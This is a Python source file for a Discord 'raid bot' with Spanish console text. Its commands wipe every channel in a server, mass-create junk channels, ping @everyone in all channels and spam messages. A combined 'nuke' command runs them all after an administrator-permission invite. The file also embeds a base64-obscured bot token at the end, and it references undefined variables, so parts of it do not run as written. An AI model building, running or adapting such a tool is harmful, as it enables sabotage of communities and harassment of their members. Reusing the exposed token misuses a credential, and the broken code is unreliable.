from modules.discord.ext import commands
import modules.base64 as base64
import modules.webbrowser as webbrowser
import modules.os as os
from modules.colorama import Fore
import modules.ctypes as ctypes
import time
import modules.requests as requests
import updater
from modules.pathlib import Path

print('\033[31m')
print('\033[30m')
os.system("cls")



# -------------------------------------------------------------------
#                          LOGO AND USAGE
# -------------------------------------------------------------------

# Title
ctypes.windll.kernel32.SetConsoleTitleW(
    f"Raid Bot | By Mega and ZX")

logousage = f"""{Fore.RED}

                                    _____________________________________________________
                                    ___  __ \__    |___  _/__  __ \__  __ )_  __ \__  __/
                                    __  /_/ /_  /| |__  / __  / / /_  __  |  / / /_  /   
                                    _  _, _/_  ___ |_/ /  _  /_/ /_  /_/ // /_/ /_  /    
                                    /_/ |_| /_/  |_/___/  /_____/ /_____/ \____/ /_/     
                                                                                        
                                                                        {Fore.RESET}by Mega and ZX
                                      _____                        __       
                                     / ___/__  __ _  ___ ____  ___/ /__  ___
                                    / /__/ _ \/  ' \/ _ `/ _ \/ _  / _ \(_-<
                                    \___/\___/_/_/_/\_,_/_//_/\_,_/\___/___/
                                        
{Fore.RED}------------------------------------------------------------------------------------------------------------------------
  
  {Fore.RESET}[{Fore.RED}1{Fore.RESET}] {Fore.GREEN}&delc {Fore.RED}|{Fore.RESET} Borra todos los canales
  {Fore.RESET}[{Fore.RED}2{Fore.RESET}] {Fore.GREEN}&spam {Fore.MAGENTA}(mensaje) (cantidad) {Fore.RED}|{Fore.RESET} Spamea el mensaje introducido en todos los canales
  {Fore.RESET}[{Fore.RED}3{Fore.RESET}] {Fore.GREEN}&cc {Fore.MAGENTA}(nombre) (cantidad) {Fore.RED}|{Fore.RESET} Crea tantos canales como introducidos con el nombre introducido
  {Fore.RESET}[{Fore.RED}4{Fore.RESET}] {Fore.GREEN}&nuke {Fore.MAGENTA}(nombre) (cantidad) (mensaje) {Fore.RED}|{Fore.RESET} Usa todos los comandos
"""

# -------------------------------------------------------------------
#                              UPDATE
# -------------------------------------------------------------------

print(f"{Fore.RED}Comprobando si hay actualizaciones...")
updater.update(Path(__file__).stem, logo)
os.system("cls")

print(logo + usage + Fore.RESET)



invite = input(f"{Fore.RED}  ¿Deseas {Fore.MAGENTA}invitar{Fore.RED} al bot? {Fore.LIGHTBLACK_EX}Se abrirá la invitación en tu navegador predeteminado. {Fore.RESET}({Fore.GREEN}S{Fore.RESET}/{Fore.RED}N{Fore.RESET}) {Fore.RED}|{Fore.RESET} ")

if invite.lower() == "s":
    webbrowser.open_new_tab("https://discord.com/api/oauth2/authorize?client_id=988774776208252928&permissions=8&scope=bot")

start = input(f"{Fore.RED}  ¿Deseas {Fore.MAGENTA}iniciar{Fore.RED} el bot? {Fore.RESET}({Fore.GREEN}S{Fore.RESET}/{Fore.RED}N{Fore.RESET}) {Fore.RED}|{Fore.RESET} ")
print('\n')
if start.lower() == "n":
    print(f"{Fore.RED}Cerrando...")
    time.sleep(1)
    quit()

print(f"{Fore.RED}  {Fore.RESET}[{Fore.RED}!{Fore.RESET}]{Fore.RED} Iniciando...", end="\r")


# -------------------------------------------------------------------
#                              BOT
# -------------------------------------------------------------------

client = commands.Bot(command_prefix='&')
client.remove_command("help")

# ------------------------DELC------------------------------


@client.command()
async def delc(ctx):
    user = ctx.message.author

    # Print
    print(f"{Fore.RED}      {Fore.RESET}[{Fore.RED}!{Fore.RESET}] {Fore.GREEN}{user}{Fore.RED} ha utilizado el comando {Fore.MAGENTA}delc{Fore.RESET} en el servidor {Fore.MAGENTA}{ctx.message.guild.name}{Fore.RED}.{Fore.RESET}")
    
    await ctx.message.delete()

    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            pass
    await ctx.guild.create_text_channel(f"raided-channel")
    
    # Print
    print(f"{Fore.RED}      {Fore.RESET}[{Fore.RED}!{Fore.RESET}]{Fore.RED} El comando {Fore.MAGENTA}delc{Fore.RED} en el servidor {Fore.MAGENTA}{ctx.message.guild.name}{Fore.RED} ha finalizado.{Fore.RESET}")


# ------------------------SPAM------------------------------


@client.command()
async def spam(ctx, message="RAIDED", num=100):
    user = ctx.message.author

    # Print
    print(f"{Fore.RED}      {Fore.RESET}[{Fore.RED}!{Fore.RESET}] {Fore.GREEN}{user}{Fore.RED} ha utilizado el comando {Fore.MAGENTA}spam{Fore.RESET}{Fore.RED} en el servidor {Fore.MAGENTA}{ctx.message.guild.name}")
    
    await ctx.message.delete()

    for i in range(num):
            await ctx.send(message)
    
    # Print
    print(f"{Fore.RED}      {Fore.RESET}[{Fore.RED}!{Fore.RESET}]{Fore.RED} El comando {Fore.MAGENTA}spam{Fore.RED} en el servidor {Fore.MAGENTA}{ctx.message.guild.name}{Fore.RED} ha finalizado.{Fore.RESET}")


# ------------------------PING------------------------------


@client.command()
async def ping(ctx):
    user = ctx.message.author
    
    # Print
    print(f"{Fore.RED}      {Fore.RESET}[{Fore.RED}!{Fore.RESET}] {Fore.GREEN}{user}{Fore.RED} ha utilizado el comando {Fore.MAGENTA}ping{Fore.RESET}{Fore.RED} en el servidor {Fore.MAGENTA}{ctx.message.guild.name}{Fore.RED}.{Fore.RESET}")

    await ctx.message.delete()
    
    for channel in ctx.guild.channels:
        try:
            await channel.send("@everyone")
        except:
            pass
    
    # Print
    print(f"{Fore.RED}      {Fore.RESET}[{Fore.RED}!{Fore.RESET}]{Fore.RED} El comando {Fore.MAGENTA}ping{Fore.RED} en el servidor {Fore.MAGENTA}{ctx.message.guild.name}{Fore.RED} ha finalizado.{Fore.RESET}")

# ------------------------CC------------------------------

@client.command()
async def cc(ctx, name="RAIDED", num=100):
    user = ctx.message.author
    
    # Print
    print(f"{Fore.RED}      {Fore.RESET}[{Fore.RED}!{Fore.RESET}] {Fore.GREEN}{user}{Fore.RED} ha utilizado el comando {Fore.MAGENTA}cc{Fore.RESET}{Fore.RED} en el servidor {Fore.MAGENTA}{ctx.message.guild.name}{Fore.RED}.{Fore.RESET}")
    
    await ctx.message.delete()
    
    for i in range(num):
        try:
            await ctx.guild.create_text_channel(name)
        except:
            pass
    
    # Print
    print(f"{Fore.RED}      {Fore.RESET}[{Fore.RED}!{Fore.RESET}]{Fore.RED} El comando {Fore.MAGENTA}cc{Fore.RED} en el servidor {Fore.MAGENTA}{ctx.message.guild.name}{Fore.RED} ha finalizado.")


# ------------------------NUKE------------------------------


@client.command()
async def nuke(ctx, name="RAIDED", num=100, message=None):
    
    user = ctx.message.author

    # Print
    print(f"{Fore.RED}      {Fore.RESET}[{Fore.RED}!{Fore.RESET}] {Fore.GREEN}{user}{Fore.RED} Se ha utilizado el comando {Fore.MAGENTA}nuke{Fore.RESET}{Fore.RED} en el servidor {Fore.MAGENTA}{ctx.message.guild.name}{Fore.RED}.{Fore.RESET}")

    await ctx.message.delete()
    
    # Command "delc" (Delete Channels)
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            pass
    
    # Command "cc" (Create as many channels as specified (deafult 100))
    for i in range(num):
        try:
            await ctx.guild.create_text_channel(name)
        except:
            pass

    # Command "ping" (Send "@everyone" in all channels)
    for channel in ctx.guild.channels:
        try:
            await channel.send("@everyone")
        except:
            pass

    # Command "spam" (Spam a specified message in all channels)
    if message == None:
        pass
    else:
        for i in range(num):
            await ctx.send(message)

    # Print
    print(f"{Fore.RED}      {Fore.RESET}[{Fore.RED}!{Fore.RESET}]{Fore.RED} El comando {Fore.MAGENTA}delc{Fore.RED} en el servidor {Fore.MAGENTA}{ctx.message.guild.name}{Fore.RED} ha finalizado.")
@client.event
async def on_ready():
    print(f"{Fore.RED}  {Fore.RESET}[{Fore.RED}!{Fore.RESET}]{Fore.RED} El bot se ha iniciado.{Fore.RESET}")
    time.sleep(3)
    os.system("cls")
    print(logo + usage + f"\n{Fore.GREEN}  El bot está activo.{Fore.RED}\n" + f"""\n  Comandos usados:{Fore.RESET}\n""", '\033[1m' + f'      {Fore.LIGHTBLACK_EX}Aquí se mostrarán los comandos utilizados cuando se utilizen y cuando finalizen.' + '\033[0m', Fore.RESET, '\n\n')


base64_string =" T1RnNE56YzBOemMyTWpBNE1qVXlPVEk0LkcwNzhZUy5xMlM5RlN2blhSZ2Z6ZGRtLVR0UWRwVGk2OVhmNzAwc2RCOV94NA=="
base64_bytes = base64_string.encode("ascii")
token_bytes = base64.b64decode(base64_bytes)
token = token_bytes.decode("ascii")

client.run(token)
